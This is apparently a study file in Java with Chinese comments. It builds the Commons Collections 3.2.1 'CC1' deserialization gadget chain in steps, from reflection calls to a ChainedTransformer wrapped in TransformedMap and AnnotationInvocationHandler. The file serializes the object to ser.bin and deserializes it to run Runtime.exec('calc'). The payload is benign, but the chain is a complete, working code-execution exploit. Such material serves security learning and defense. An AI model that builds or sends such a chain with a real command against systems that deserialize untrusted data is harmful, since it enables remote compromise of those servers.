package org.emample;

//CC版本3.2.1

//import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        //弹计算器
        //普通调用
        //Runtime.getRuntime().exec("calc");
        //---------------------------

        //反射调用
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");

        //---------------------------

        //用Transformer的漏洞（参数就是InvokerTransformer的参数），然后调用transform()方法，从而实现利用
        //Runtime r = Runtime.getRuntime();
        //new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
        //---------------------------

//        Runtime r = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行
//
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

//        for(Map.Entry entry:transformedMap.entrySet()) {
//            entry.setValue(r);//输入要运行的方法
//        }

        //---------------------------

        //Runtime r = Runtime.getRuntime();

//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行
//
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
//
//        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
//        anno.setAccessible(true);//设置权限，可以访问
//        Object o = anno.newInstance(Override.class, transformedMap);//实例化
//        serialize(o);//序列化
//        unserialize("ser.bin");//反序化

        //---------------------------




        //Class c= Runtime.class;
        //Method getRuntimeMethod = c.getMethod("getRuntime", null);//null代表是一个无参方法
        //Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);//反射调用，第一个null意味是一个静态方法，第二个意味着无参
        //Method execMethod = c.getMethod("exec", String.class);
        //execMethod.invoke(r,"calc");//反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数

        //---------------------------
        //逐条转换，套用到InvokerTransformer方法中
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);//作用为c.getMethod("getRuntime", null);
//        //其中的String.class, Class[].class是getMethod的参数类型getRuntime, null是参数,最后用Runtime.class调用（相当于那个c）
//        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);//相当于Method execMethod = c.getMethod("exec", String.class);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);//相当于Method execMethod = c.getMethod("exec", String.class);execMethod.invoke(r,"calc");
        // 反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数

        //---------------------------

        //简化
//        Transformer[] transformers = {
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//        };
//
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);//调最初的那个参数

        //---------------------------

        //加入到反序化

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };


        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);



        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
        serialize(o);//序列化
        unserialize("ser.bin");//反序化


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
